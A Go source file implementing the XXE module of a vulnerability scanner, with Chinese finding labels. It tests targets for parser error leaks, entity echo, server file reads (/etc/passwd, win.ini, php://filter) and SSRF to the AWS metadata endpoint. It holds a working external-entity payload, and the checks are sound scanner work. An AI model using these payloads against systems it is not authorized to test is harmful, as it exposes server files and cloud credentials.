package xxe

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"vulnscan-backend/model"
	"vulnscan-backend/pkg/payload"
	"vulnscan-backend/scan/core"
	"vulnscan-backend/scan/vulnkit"
)

type XXEScanner struct {
	base     *vulnkit.VulnScanner
	payloads *payload.Loader
}

func New(loader *payload.Loader) *XXEScanner {
	return &XXEScanner{payloads: loader}
}

func (m *XXEScanner) ID() string       { return "xxe" }
func (m *XXEScanner) Name() string     { return "XXE 外部实体注入" }
func (m *XXEScanner) Category() string { return "vuln" }

func (m *XXEScanner) Params() []core.ModuleParam {
	return []core.ModuleParam{core.VulnVerificationParam()}
}

var hostnamePattern = regexp.MustCompile(`^[a-zA-Z0-9._-]+$`)

var xmlParserErrors = []*regexp.Regexp{
	regexp.MustCompile(`(?i)XML\s+Parsing\s+Error`),
	regexp.MustCompile(`(?i)SAXParseException`),
	regexp.MustCompile(`(?i)simplexml_load_string`),
	regexp.MustCompile(`(?i)DOMDocument::loadXML`),
	regexp.MustCompile(`(?i)JAXP.*error`),
	regexp.MustCompile(`(?i)lxml\.etree`),
	regexp.MustCompile(`(?i)xml\.parsers\.expat`),
	regexp.MustCompile(`(?i)XMLSyntaxError`),
	regexp.MustCompile(`(?i)Start tag expected`),
	regexp.MustCompile(`(?i)EntityRef`),
}

func (m *XXEScanner) Run(ctx context.Context, targets []*core.Target, config map[string]interface{}) (*core.ModuleResult, error) {
	m.base = vulnkit.NewVulnScanner(config)
	verifyLevel := core.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *core.Target) []*core.Finding {
		return m.testTarget(ctx, target, verifyLevel)
	})

	vulnkit.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

func (m *XXEScanner) testTarget(ctx context.Context, target *core.Target, verifyLevel string) []*core.Finding {
	var findings []*core.Finding

	if core.ShouldRunPrinciple(verifyLevel) {
		if f := m.testXMLAcceptance(ctx, target); f != nil {
			findings = append(findings, f)
		}
		if f := m.testEntityEcho(ctx, target); f != nil {
			findings = append(findings, f)
		}
	}

	if core.ShouldRunExploit(verifyLevel) {
		if f := m.testFileRead(ctx, target); f != nil {
			findings = append(findings, f)
		}
		if f := m.testSSRFViaXXE(ctx, target); f != nil {
			findings = append(findings, f)
		}
	}

	return findings
}

func (m *XXEScanner) testXMLAcceptance(ctx context.Context, target *core.Target) *core.Finding {
	malformedXML := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxetest "xxe_test_value">]><root>&xxetest;</root>`

	body := m.base.SendXML(ctx, target.URL, malformedXML)
	if body == "" {
		return nil
	}

	for _, pattern := range xmlParserErrors {
		if pattern.MatchString(body) {
			return &core.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "xxe_error",
				Title:              "XXE XML解析器错误泄露",
				Description:        "目标接受XML输入并泄露解析器错误信息",
				Severity:           "medium",
				Confidence:         65,
				Evidence:           vulnkit.Truncate(body, 500),
				VerificationLevel:  core.VerifyPrinciple,
				VerificationDetail: "xml-parser-error-detected",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"url":  target.URL,
					"type": "xxe-error",
				},
			}
		}
	}

	return nil
}

func (m *XXEScanner) testEntityEcho(ctx context.Context, target *core.Target) *core.Finding {
	payload := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxecanary "xxe_49_test">]><root><data>&xxecanary;</data></root>`

	body := m.base.SendXML(ctx, target.URL, payload)
	if body == "" {
		return nil
	}

	if strings.Contains(body, "xxe_49_test") {
		return &core.Finding{
			ModuleID:           m.ID(),
			Target:             target,
			Type:               "xxe_entity",
			Title:              "XXE 内部实体解析",
			Description:        "目标解析并回显了XML内部实体定义，表明XML解析器处理DTD",
			Severity:           "high",
			Confidence:         75,
			Evidence:           vulnkit.Truncate(body, 500),
			VerificationLevel:  core.VerifyPrinciple,
			VerificationDetail: "internal-entity-resolved",
			Timestamp:          time.Now(),
			Data: map[string]string{
				"url":  target.URL,
				"type": "xxe-entity-echo",
			},
		}
	}

	return nil
}

type xxeFilePayload struct {
	payload  string
	evidence string
	file     string
}

func (m *XXEScanner) getFilePayloads() []xxeFilePayload {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("xxe")
		var result []xxeFilePayload
		for _, p := range dbPayloads {
			if p.Type == "file_read" {
				evidence := p.Expect
				if evidence == "" {
					if strings.Contains(p.Value, "passwd") {
						evidence = "root:x:0:0"
					} else if strings.Contains(p.Value, "win.ini") {
						evidence = "[fonts]"
					} else if strings.Contains(p.Value, "php://filter") {
						evidence = "PD9waHA"
					}
				}
				file := p.Name
				if file == "" {
					file = p.Value
				}
				result = append(result, xxeFilePayload{
					payload:  p.Value,
					evidence: evidence,
					file:     file,
				})
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	payload.LogFallbackOnce("xxe")
	p, ev, f := payload.MinimalXXEFilePayload()
	return []xxeFilePayload{{payload: p, evidence: ev, file: f}}
}

func (m *XXEScanner) testFileRead(ctx context.Context, target *core.Target) *core.Finding {
	for _, fp := range m.getFilePayloads() {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		body := m.base.SendXML(ctx, target.URL, fp.payload)
		if body == "" {
			continue
		}

		detected := false
		if fp.evidence != "" && strings.Contains(body, fp.evidence) {
			detected = true
		}
		if fp.file == "/etc/hostname" && len(body) > 0 && !strings.Contains(body, "<?xml") && !strings.Contains(body, "<html") {
			if hostnamePattern.MatchString(strings.TrimSpace(body)) {
				detected = true
			}
		}

		if detected {
			return &core.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "xxe_file_read",
				Title:              fmt.Sprintf("XXE 文件读取 - %s", fp.file),
				Description:        fmt.Sprintf("通过XXE成功读取服务器文件 %s", fp.file),
				Severity:           "critical",
				Confidence:         92,
				Evidence:           vulnkit.Truncate(body, 500),
				VerificationLevel:  core.VerifyExploit,
				VerificationDetail: "file-content-confirmed",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"url":  target.URL,
					"file": fp.file,
					"type": "xxe-file-read",
				},
			}
		}
	}

	return nil
}

type xxeSSRFPayload struct {
	payload  string
	evidence string
	target   string
}

func (m *XXEScanner) getSSRFPayloads() []xxeSSRFPayload {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("xxe")
		var result []xxeSSRFPayload
		for _, p := range dbPayloads {
			if p.Type == "blind" || p.Type == "ssrf" {
				evidence := p.Expect
				if evidence == "" {
					if strings.Contains(p.Value, "169.254.169.254") {
						evidence = "ami-id"
					}
				}
				target := p.Name
				if target == "" {
					target = "Internal Service"
				}
				result = append(result, xxeSSRFPayload{
					payload:  p.Value,
					evidence: evidence,
					target:   target,
				})
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	payload.LogFallbackOnce("xxe")
	return []xxeSSRFPayload{{
		payload:  `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
		evidence: "ami-id",
		target:   "AWS Metadata",
	}}
}

func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *core.Target) *core.Finding {
	for _, mp := range m.getSSRFPayloads() {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		body := m.base.SendXML(ctx, target.URL, mp.payload)
		if body == "" {
			continue
		}

		if strings.Contains(body, mp.evidence) {
			return &core.Finding{
				ModuleID:           m.ID(),
				Target:             target,
				Type:               "xxe_ssrf",
				Title:              fmt.Sprintf("XXE SSRF - %s", mp.target),
				Description:        fmt.Sprintf("通过XXE实体访问内部服务 %s 成功", mp.target),
				Severity:           "critical",
				Confidence:         93,
				Evidence:           vulnkit.Truncate(body, 500),
				VerificationLevel:  core.VerifyExploit,
				VerificationDetail: "internal-service-accessed",
				Timestamp:          time.Now(),
				Data: map[string]string{
					"url":    target.URL,
					"target": mp.target,
					"type":   "xxe-ssrf",
				},
			}
		}
	}

	return nil
}

var _ = model.VulnPayload{}
